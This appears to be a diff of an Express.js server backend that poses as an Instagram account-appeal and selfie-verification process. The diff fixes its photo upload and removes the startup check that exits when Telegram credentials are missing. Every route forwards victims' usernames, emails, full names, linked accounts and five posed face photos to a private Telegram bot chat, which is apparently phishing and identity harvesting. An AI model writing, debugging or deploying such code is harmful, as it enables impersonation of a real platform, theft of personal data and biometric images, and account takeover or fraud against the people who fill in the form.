@@ -1,112 +1,66 @@
 const express = require('express');
 const multer = require('multer');
-const fetch = require('node-fetch');
 const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Environment variables (Render पर set करें)
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 if (!BOT_TOKEN || !CHAT_ID) {
-  console.error('❌ TELEGRAM_BOT_TOKEN या TELEGRAM_CHAT_ID environment variables set नहीं हैं!');
-  process.exit(1); // सर्वर start ही न हो
+  console.error('❌ Token/Chat ID set nahi hai!');
 }
 
-// Middleware
 app.use(express.json());
 app.use(express.static('public'));
 
-// Multer setup for file uploads (selfies)
 const upload = multer({ storage: multer.memoryStorage() });
 
-// ---------- API Routes ----------
-
-// 1. Form data submit
+// 1. Form Data (Text)
 app.post('/api/submit-form', (req, res) => {
   const { type, username, email, fullname, alternative, relationship } = req.body;
-  const message = `📋 <b>Instagram Appeal Form</b>
-
-<b>Type:</b> ${type}
-━━━━━━━━━━━━━━━━━━━━
-<b>👤 Username:</b> ${username}
-<b>📧 Email:</b> ${email}
-<b>📝 Name:</b> ${fullname}
-<b>🔗 Alt Account:</b> ${alternative || 'N/A'}
-<b>👥 Relationship:</b> ${relationship}
-━━━━━━━━━━━━━━━━━━━━
-<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
-
-  sendTelegramMessage(message)
-    .then(() => res.json({ success: true }))
-    .catch(err => {
-      console.error(err);
-      res.status(500).json({ error: 'Failed to send form' });
-    });
+  const message = `📋 <b>Instagram Appeal Form</b>\n\n<b>Type:</b> ${type}\n━━━━━━━━━━━━━━━━━━━━\n<b>👤 Username:</b> ${username}\n<b>📧 Email:</b> ${email}\n<b>📝 Name:</b> ${fullname}\n<b>🔗 Alt Account:</b> ${alternative || 'N/A'}\n<b>👥 Relationship:</b> ${relationship}\n━━━━━━━━━━━━━━━━━━━━\n<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+  sendTelegramMessage(message).then(() => res.json({ success: true })).catch(err => res.status(500).json({ error: 'Failed' }));
 });
 
-// 2. Selfie upload (with pose info)
+// 2. Selfie Photo (Yahan problem thi)
 app.post('/api/submit-selfie', upload.single('photo'), (req, res) => {
-  const { username, formType, poseText, poseNumber } = req.body;
-  const photoBuffer = req.file.buffer;
+  console.log('📸 Selfie request received');
+  console.log('File info:', req.file); // Render Logs mein check karo
 
-  if (!photoBuffer) {
+  const { username, formType, poseText, poseNumber } = req.body;
+  if (!req.file) {
+    console.log('❌ No file in request');
     return res.status(400).json({ error: 'No photo uploaded' });
   }
 
-  const caption = `📸 <b>Verification Selfie ${poseNumber}/5</b>
+  const caption = `📸 <b>Verification Selfie ${poseNumber}/5</b>\n\n<b>👤 User:</b> ${username}\n<b>📝 Pose:</b> ${poseText}\n<b>📋 Type:</b> ${formType}\n<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
 
-<b>👤 User:</b> ${username}
-<b>📝 Pose:</b> ${poseText}
-<b>📋 Type:</b> ${formType}
-<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
-
-  sendTelegramPhoto(photoBuffer, caption)
+  sendTelegramPhoto(req.file.buffer, caption)
     .then(() => res.json({ success: true }))
     .catch(err => {
-      console.error(err);
+      console.error('Telegram Photo Error:', err);
       res.status(500).json({ error: 'Failed to send photo' });
     });
 });
 
-// 3. Verification complete
+// 3. Verification Complete
 app.post('/api/verification-complete', (req, res) => {
   const { username, email, fullname, formType } = req.body;
-  const message = `✅ <b>VERIFICATION COMPLETED</b>
-
-<b>👤 User:</b> ${username}
-<b>📧 Email:</b> ${email}
-<b>📝 Name:</b> ${fullname}
-<b>📋 Form:</b> ${formType}
-<b>📸 Photos:</b> 5/5
-<b>✓ Status:</b> Ready for Review
-<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
-
-  sendTelegramMessage(message)
-    .then(() => res.json({ success: true }))
-    .catch(err => {
-      console.error(err);
-      res.status(500).json({ error: 'Failed to send completion' });
-    });
+  const message = `✅ <b>VERIFICATION COMPLETED</b>\n\n<b>👤 User:</b> ${username}\n<b>📧 Email:</b> ${email}\n<b>📝 Name:</b> ${fullname}\n<b>📋 Form:</b> ${formType}\n<b>📸 Photos:</b> 5/5\n<b>✓ Status:</b> Ready for Review\n<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+  sendTelegramMessage(message).then(() => res.json({ success: true })).catch(err => res.status(500).json({ error: 'Failed' }));
 });
 
-// ---------- Telegram helper functions ----------
+// ---------- Telegram Helpers (Native Fetch का use) ----------
 async function sendTelegramMessage(text) {
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
   const response = await fetch(url, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: text,
-      parse_mode: 'HTML'
-    })
+    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
   });
-  if (!response.ok) {
-    throw new Error(`Telegram error: ${response.status}`);
-  }
+  if (!response.ok) throw new Error('Telegram sendMessage failed');
   return response.json();
 }
 
@@ -114,7 +68,7 @@ async function sendTelegramPhoto(buffer, caption) {
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
   const formData = new FormData();
   formData.append('chat_id', CHAT_ID);
-  formData.append('photo', buffer, 'selfie.jpg');
+  formData.append('photo', buffer, 'selfie.jpg'); // Buffer + filename = Working!
   formData.append('caption', caption);
   formData.append('parse_mode', 'HTML');
 
@@ -122,13 +76,13 @@ async function sendTelegramPhoto(buffer, caption) {
     method: 'POST',
     body: formData
   });
+  
   if (!response.ok) {
-    throw new Error(`Telegram error: ${response.status}`);
+    const errorText = await response.text();
+    console.error('Telegram API Error Response:', errorText);
+    throw new Error('Telegram sendPhoto failed');
   }
   return response.json();
 }
 
-// Start server
-app.listen(PORT, () => {
-  console.log(`✅ Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
